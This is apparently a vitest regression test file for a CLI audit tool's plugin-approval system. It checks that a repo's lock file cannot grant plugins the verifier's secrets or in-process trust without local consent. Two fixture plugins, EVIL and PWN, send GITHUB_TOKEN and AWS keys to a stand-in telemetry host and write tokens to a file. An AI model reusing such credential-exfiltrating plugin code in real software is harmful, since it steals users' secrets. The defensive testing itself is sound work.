import { afterAll, describe, expect, it } from "vitest";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createAuditContext, openProvider } from "../src/api/context.js";
import { buildProgram } from "../src/cli.js";
import type { CommandContext } from "../src/commands/context.js";
import { loadConfig, windowPaths } from "../src/config.js";
import { closeAllPluginHosts } from "../src/plugins/host.js";
import { readLock } from "../src/plugins/lock.js";
import { setupAuditRepo } from "./helpers/audit-scenario.js";

/**
 * Finding 1 of the plugin and broker review: a third party who runs `pr-rla verify` on someone
 * else's audit repo must not hand that repo's plugins their secrets, or run its code in their own
 * process, because the repo's pr-rla.lock.json says so. Credential grants and `trust: full` need the
 * local consent of the person running the command (src/plugins/approvals.ts).
 *
 * The auditee and the verifier each have their own approvals file, as on two machines. The
 * reproductions import nothing new at the top, so this file runs against the code before the fix
 * too (where they fail); the approvals module is imported where a test needs it.
 */
const approvals = () => import("../src/plugins/approvals.js");

afterAll(() => closeAllPluginHosts());

const WINDOW = { opensAt: "2026-07-01T00:00:00Z", closesAt: "2026-10-01T00:00:00Z" };

/** The review's exp/audit2 plugin: declares GITHUB_TOKEN and AWS_SECRET_ACCESS_KEY for its own telemetry host, and sends them at create(). */
const EVIL = `import { defineProvider } from "pr-rla/provider";
export default defineProvider({
  providerApiVersion: 1, name: "innocuous-scm",
  description: "an SCM provider",
  hosts: () => ["scm.example.com", "telemetry.auditee.example"],
  credentials: [{ env: "GITHUB_TOKEN", hosts: ["telemetry.auditee.example"] }, { env: "AWS_SECRET_ACCESS_KEY", hosts: ["telemetry.auditee.example"] }],
  async create(options, ctx) {
    const tried = {};
    for (const env of ["GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"]) {
      if (ctx.env[env]) await ctx.fetch("https://telemetry.auditee.example/ping", { headers: { authorization: "Bearer " + ctx.env[env] } }).catch(() => {});
      // A placeholder written into the code, whatever the environment says.
      tried[env] = await ctx.fetch("https://telemetry.auditee.example/hardcoded", { headers: { authorization: "Bearer prrla-cred:" + env } }).then((r) => "sent " + r.status, (e) => e.code ?? e.message);
    }
    return { apiVersion: 1, name: "innocuous-scm", async listChanges() { return { changes: [], defaultBranch: "main", limitations: [JSON.stringify({ env: Object.keys(process.env).sort(), tried })] }; } };
  },
});
`;

/** The review's exp/audit3 plugin: proves it ran in the verifier's own process by writing a file. */
const PWN = `import { writeFileSync } from "node:fs";
if (process.env.PR_RLA_HOST !== "1") writeFileSync(new URL("../PWNED.txt", import.meta.url), "pid=" + process.pid + " GITHUB_TOKEN=" + process.env.GITHUB_TOKEN + "\\n");
export default { providerApiVersion: 1, name: "p", hosts: () => ["scm.example.com"], create() { return { apiVersion: 1, name: "p", async listChanges() { return { changes: [], defaultBranch: "main" }; } }; } };
`;

const SECRETS = { GITHUB_TOKEN: "ghp_VERIFIER_SECRET", AWS_SECRET_ACCESS_KEY: "AWS_VERIFIER_SECRET" };

function machine(name: string): string {
  return join(mkdtempSync(join(tmpdir(), `prrla-${name}-`)), "approvals.json");
}

interface Sent {
  url: string;
  authorization: string | null;
}

function auditRepo(file: string, source: string): { dir: string; use: string } {
  const use = `./plugins/${file}`;
  const s = setupAuditRepo({ changes: [], provider: `{ use: ${use}, options: {} }` });
  mkdirSync(join(s.dir, "plugins"));
  writeFileSync(join(s.dir, "plugins", file), source);
  return { dir: s.dir, use };
}

/** Runs the CLI in `dir` as someone whose environment is `env` (their approvals file included). */
async function cli(dir: string, args: string[], env: Record<string, string>, sent: Sent[] = [], extra: Partial<CommandContext> = {}): Promise<{ code: number; out: string[]; err: string[] }> {
  const out: string[] = [];
  const err: string[] = [];
  let code = -1;
  const transport = (async (input: string | URL, init?: RequestInit) => {
    sent.push({ url: String(input), authorization: new Headers(init?.headers).get("authorization") });
    return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  const ctx: CommandContext = { cwd: dir, env, nowMs: () => Date.parse("2026-11-04T00:00:00Z"), fetch: transport, out: (l) => out.push(l), err: (l) => err.push(l), sleep: async () => {}, ...extra };
  await buildProgram(() => ctx, (c) => (code = c)).parseAsync(["node", "pr-rla", ...args]);
  return { code, out, err };
}

/** The auditee locks the plugin (on their machine) and leaves a registration for verify to read. */
async function auditeeLocks(dir: string, use: string, auditee: string, trust: "isolated" | "full" = "isolated"): Promise<void> {
  const add = await cli(dir, ["plugin", "add", use, "--yes", "--trust", trust], { PR_RLA_APPROVALS_FILE: auditee });
  expect(add.code, add.err.join("\n")).toBe(0);
  const paths = windowPaths(loadConfig(join(dir, ".pr-rla.yml")));
  mkdirSync(paths.windowDir, { recursive: true });
  writeFileSync(paths.registration, JSON.stringify({ record: {}, signature: "x" }));
}

const leaked = (sent: Sent[]) => sent.filter((s) => Object.values(SECRETS).some((v) => s.authorization?.includes(v)));

describe("a third party's verify withholds the repo lock's credential grants (finding 1)", () => {
  it("an isolated plugin locked by someone else gets no secret, not even a placeholder, and one line names plugin approve", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    await auditeeLocks(dir, use, machine("auditee"));
    const sent: Sent[] = [];
    const v = await cli(dir, ["verify"], { ...SECRETS, PR_RLA_APPROVALS_FILE: machine("verifier") }, sent);
    // Before the fix the broker sent "Bearer ghp_VERIFIER_SECRET" and "Bearer AWS_VERIFIER_SECRET" to telemetry.auditee.example here.
    expect(leaked(sent)).toEqual([]);
    expect(sent.filter((s) => s.url.includes("telemetry.auditee.example") && s.authorization !== null)).toEqual([]);
    expect(v.err).toContain(`plugin ${use}: not approved on this machine, so its credentials are withheld (AWS_SECRET_ACCESS_KEY -> https://telemetry.auditee.example; GITHUB_TOKEN -> https://telemetry.auditee.example) and it runs without them; to grant them: pr-rla plugin approve ${use}`);
  });

  it("a placeholder written into the plugin's code is refused CREDENTIAL_NOT_APPROVED, unsent; the child's environment has no credential", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    await auditeeLocks(dir, use, machine("auditee"));
    const sent: Sent[] = [];
    const ctx = createAuditContext({ mode: "read-only", env: { ...SECRETS }, approvalsFile: machine("verifier"), fetch: (async (u: string | URL, init?: RequestInit) => (sent.push({ url: String(u), authorization: new Headers(init?.headers).get("authorization") }), new Response("{}"))) as typeof fetch });
    const p = await openProvider(ctx, { use, options: {} }, dir);
    const seen = JSON.parse((await p.listChanges({ repo: "acme/widgets", window: WINDOW, kinds: ["pull_request"] })).limitations[0]!) as { env: string[]; tried: Record<string, string> };
    expect(seen.tried).toEqual({ GITHUB_TOKEN: "CREDENTIAL_NOT_APPROVED", AWS_SECRET_ACCESS_KEY: "CREDENTIAL_NOT_APPROVED" });
    expect(seen.env.filter((k) => k !== "__CF_USER_TEXT_ENCODING")).toEqual(["PR_RLA_HOST"]);
    expect(sent).toEqual([]);
  });

  it("the person who added it is approved by plugin add, so their own runs keep their grants", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    const auditee = machine("auditee");
    await auditeeLocks(dir, use, auditee);
    expect((await approvals()).readApprovals(auditee).approvals).toEqual([expect.objectContaining({ kind: "plugin", use, trust: "isolated", treeSha256: readLock(dir).plugins[use]!.treeSha256, credentials: [{ env: "AWS_SECRET_ACCESS_KEY", origins: ["https://telemetry.auditee.example"] }, { env: "GITHUB_TOKEN", origins: ["https://telemetry.auditee.example"] }], writePaths: [] })]);
    const sent: Sent[] = [];
    const v = await cli(dir, ["verify"], { GITHUB_TOKEN: "ghp_AUDITEE_OWN", PR_RLA_APPROVALS_FILE: auditee }, sent);
    expect(v.err.some((l) => l.includes("withheld"))).toBe(false);
    expect(sent.filter((s) => s.authorization === "Bearer ghp_AUDITEE_OWN").map((s) => new URL(s.url).host)).toEqual(["telemetry.auditee.example", "telemetry.auditee.example"]);
  });

  it("plugin approve shows the env vars and origins it grants, needs --yes without a terminal, and then the grants apply", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    await auditeeLocks(dir, use, machine("auditee"));
    const verifier = machine("verifier");
    const env = { ...SECRETS, PR_RLA_APPROVALS_FILE: verifier };
    const tree = readLock(dir).plugins[use]!.treeSha256;
    const noTty = await cli(dir, ["plugin", "approve", use], env);
    expect(noTty.code).toBe(1);
    expect(noTty.out).toEqual([
      `plugin ${use}: innocuous-scm (path file:plugins/evil.mjs), treeSha256 ${tree}`,
      "  trust         isolated: out of process; it sees placeholders, never your secrets",
      "  credentials   AWS_SECRET_ACCESS_KEY -> https://telemetry.auditee.example; GITHUB_TOKEN -> https://telemetry.auditee.example",
      "  hosts         scm.example.com, telemetry.auditee.example (contacted without credentials unless granted above)",
    ]);
    expect(noTty.err.join("\n")).toMatch(/plugin approve needs your confirmation: review the lines above, then run it again with --yes/);
    expect(existsSync(verifier)).toBe(false);
    const declined = await cli(dir, ["plugin", "approve", use], env, [], { confirm: async () => false });
    expect(declined.out).toContain("not approved");
    expect(existsSync(verifier)).toBe(false);

    const yes = await cli(dir, ["plugin", "approve", use, "--yes"], env);
    expect(yes.code).toBe(0);
    expect(yes.out.at(-1)).toBe(`approved ${use} on this machine (${verifier}); a change to its files, trust or grants needs a new approval`);
    expect((await cli(dir, ["plugin", "approve", use, "--yes"], env)).out.at(-1)).toBe(`${use} is already approved on this machine, as locked (${verifier})`);
    // Written atomically, readable by its owner only.
    expect(statSync(verifier).mode & 0o777).toBe(0o600);
    const sent: Sent[] = [];
    await cli(dir, ["verify"], env, sent);
    expect(sent.filter((s) => s.authorization === `Bearer ${SECRETS.GITHUB_TOKEN}`).length).toBe(2);
  });

  it("the approval is for the plugin as locked: changed files, trust or credential grants need a new one", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    const auditee = machine("auditee");
    await auditeeLocks(dir, use, auditee);
    const verifier = machine("verifier");
    const env = { ...SECRETS, PR_RLA_APPROVALS_FILE: verifier };
    expect((await cli(dir, ["plugin", "approve", use, "--yes"], env)).code).toBe(0);
    const withheld = async () => {
      const sent: Sent[] = [];
      const v = await cli(dir, ["verify"], env, sent);
      return { leaked: leaked(sent), line: v.err.some((l) => l.startsWith(`plugin ${use}: not approved on this machine`)) };
    };
    expect(await withheld()).toEqual({ leaked: [expect.anything(), expect.anything(), expect.anything(), expect.anything()], line: false });

    // 1. The auditee changes the code and re-locks it.
    writeFileSync(join(dir, "plugins", "evil.mjs"), `${EVIL}// v2\n`);
    expect((await cli(dir, ["plugin", "lock", use, "--yes"], { PR_RLA_APPROVALS_FILE: auditee })).code).toBe(0);
    expect(await withheld()).toEqual({ leaked: [], line: true });
    expect((await cli(dir, ["plugin", "approve", use, "--yes"], env)).code).toBe(0);
    expect((await withheld()).line).toBe(false);

    // 2. The auditee edits the lock to send a credential to one more host (the plugin's code unchanged).
    const lockFile = join(dir, "pr-rla.lock.json");
    const original = readFileSync(lockFile, "utf8");
    const lock = JSON.parse(original);
    lock.plugins[use].credentials[1].hosts.push("scm.example.com");
    writeFileSync(lockFile, JSON.stringify(lock));
    expect(await withheld()).toEqual({ leaked: [], line: true });

    // 3. Or to let the plugin write somewhere more with the approved token (review of this round).
    const wider = JSON.parse(original);
    wider.plugins[use].writePaths.push("telemetry.auditee.example/");
    writeFileSync(lockFile, JSON.stringify(wider));
    expect(await withheld()).toEqual({ leaked: [], line: true });
    writeFileSync(lockFile, original);
    expect((await withheld()).line).toBe(false);
  });
});

describe("trust: full from a repo lock refuses to load without local consent (finding 1)", () => {
  it("verify refuses before importing it: nothing runs in the verifier's process", async () => {
    const { dir, use } = auditRepo("p.mjs", PWN);
    await auditeeLocks(dir, use, machine("auditee"), "full");
    // The auditee's own `plugin add --trust full` ran nothing in process (it inspects in the host).
    expect(existsSync(join(dir, "PWNED.txt"))).toBe(false);
    const v = await cli(dir, ["verify"], { ...SECRETS, PR_RLA_APPROVALS_FILE: machine("verifier") });
    expect(v.code).toBe(1);
    expect(v.err).toContain(`pr-rla: plugin ${use} is locked with trust: full (it would run in this process, with your environment and files), and you have not approved it on this machine; nothing of it was loaded`);
    expect(v.err).toContain(`  next: review it, then: pr-rla plugin approve ${use} (or run it isolated: pr-rla plugin lock ${use} --trust isolated)`);
    // Before the fix: PWNED.txt held the verifier's pid and GITHUB_TOKEN.
    expect(existsSync(join(dir, "PWNED.txt"))).toBe(false);
    // Commands that load the provider before reading a registration (freeze --dry-run previews without one).
    rmSync(windowPaths(loadConfig(join(dir, ".pr-rla.yml"))).registration);
    for (const cmd of [["freeze", "--dry-run"], ["register", "--dry-run"]]) {
      const r = await cli(dir, cmd, { ...SECRETS, PR_RLA_APPROVALS_FILE: machine("verifier") });
      expect(r.err.join("\n"), cmd.join(" ")).toMatch(/is locked with trust: full .* you have not approved it on this machine/);
      expect(existsSync(join(dir, "PWNED.txt")), cmd.join(" ")).toBe(false);
    }
  });

  it("approved with plugin approve, it loads in process and every command still says PLUGIN TRUST: full", async () => {
    const { dir, use } = auditRepo("p.mjs", PWN);
    await auditeeLocks(dir, use, machine("auditee"), "full");
    const env = { GITHUB_TOKEN: "ghp_MINE", PR_RLA_APPROVALS_FILE: machine("verifier") };
    const approve = await cli(dir, ["plugin", "approve", use, "--yes"], env);
    expect(approve.out[1]).toBe("  trust         full: IN THIS PROCESS, with your environment and files (its imports are held to its hashed files; what it reads and runs is its own)");
    const v = await cli(dir, ["verify"], env);
    expect(v.err).toContain("PLUGIN TRUST: full (p@unversioned runs with your environment and files)");
    // It ran in this process, as approved.
    expect(readFileSync(join(dir, "PWNED.txt"), "utf8")).toMatch(new RegExp(`^pid=${process.pid} `));
  });
});

describe("--accept-lock-grants and PR_RLA_ACCEPT_LOCK_GRANTS=1: the one escape, for a repo you control", () => {
  it("accepts the lock's grants and trust for that run only, and says so", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    await auditeeLocks(dir, use, machine("auditee"));
    const verifier = machine("verifier");
    for (const [args, env] of [
      [["--accept-lock-grants", "verify"], {}],
      [["verify"], { PR_RLA_ACCEPT_LOCK_GRANTS: "1" }],
    ] as [string[], Record<string, string>][]) {
      const sent: Sent[] = [];
      const v = await cli(dir, args, { ...SECRETS, PR_RLA_APPROVALS_FILE: verifier, ...env }, sent);
      expect(leaked(sent).length, args.join(" ")).toBe(4);
      expect(v.err).toContain(`plugin ${use}: accepting its lock's grants for this run, not approved on this machine (AWS_SECRET_ACCESS_KEY -> https://telemetry.auditee.example; GITHUB_TOKEN -> https://telemetry.auditee.example); --accept-lock-grants is only for a repo you control`);
    }
    // Nothing was recorded: the next run without the flag withholds again.
    expect(existsSync(verifier)).toBe(false);
    const sent: Sent[] = [];
    await cli(dir, ["verify"], { ...SECRETS, PR_RLA_APPROVALS_FILE: verifier }, sent);
    expect(leaked(sent)).toEqual([]);
  });

  it("trust: full loads with it; a typo in the variable is refused rather than ignored", async () => {
    const { dir, use } = auditRepo("p.mjs", PWN);
    await auditeeLocks(dir, use, machine("auditee"), "full");
    const v = await cli(dir, ["--accept-lock-grants", "verify"], { PR_RLA_APPROVALS_FILE: machine("verifier") });
    expect(v.err).toContain("PLUGIN TRUST: full (p@unversioned runs with your environment and files)");
    expect(v.err).toContain(`plugin ${use}: accepting its lock's grants for this run, not approved on this machine (trust: full); --accept-lock-grants is only for a repo you control`);
    const { acceptLockGrantsFrom } = await approvals();
    expect(() => acceptLockGrantsFrom(undefined, { PR_RLA_ACCEPT_LOCK_GRANTS: "true" })).toThrow(/PR_RLA_ACCEPT_LOCK_GRANTS "true": use 1/);
    expect(acceptLockGrantsFrom(undefined, { PR_RLA_ACCEPT_LOCK_GRANTS: "0" })).toBe(false);
    expect(acceptLockGrantsFrom(true, {})).toBe(true);
  });
});

describe("the approvals file", () => {
  it("lives at PR_RLA_APPROVALS_FILE, else $XDG_CONFIG_HOME/pr-rla, else ~/.config/pr-rla (paths only: nothing is written here)", async () => {
    const { approvalsFile } = await approvals();
    const saved = process.env.PR_RLA_APPROVALS_FILE;
    delete process.env.PR_RLA_APPROVALS_FILE;
    try {
      expect(approvalsFile({ PR_RLA_APPROVALS_FILE: "/a/b.json", XDG_CONFIG_HOME: "/x", HOME: "/h" })).toBe("/a/b.json");
      expect(approvalsFile({ XDG_CONFIG_HOME: "/x", HOME: "/h" })).toBe("/x/pr-rla/approvals.json");
      expect(approvalsFile({ XDG_CONFIG_HOME: "relative", HOME: "/h" })).toBe("/h/.config/pr-rla/approvals.json");
      expect(approvalsFile({ HOME: "/h", XDG_CONFIG_HOME: "" })).toBe("/h/.config/pr-rla/approvals.json");
    } finally {
      process.env.PR_RLA_APPROVALS_FILE = saved;
    }
  });

  it("a malformed file is refused by name, never read as nothing approved", async () => {
    const { dir, use } = auditRepo("evil.mjs", EVIL);
    await auditeeLocks(dir, use, machine("auditee"));
    const bad = machine("verifier");
    writeFileSync(bad, "{ not json");
    const v = await cli(dir, ["verify"], { ...SECRETS, PR_RLA_APPROVALS_FILE: bad });
    expect(v.code).toBe(1);
    expect(v.err.join("\n")).toMatch(/approvals\.json is not valid JSON[\s\S]*next: fix or remove .*approvals\.json/);
  });
});
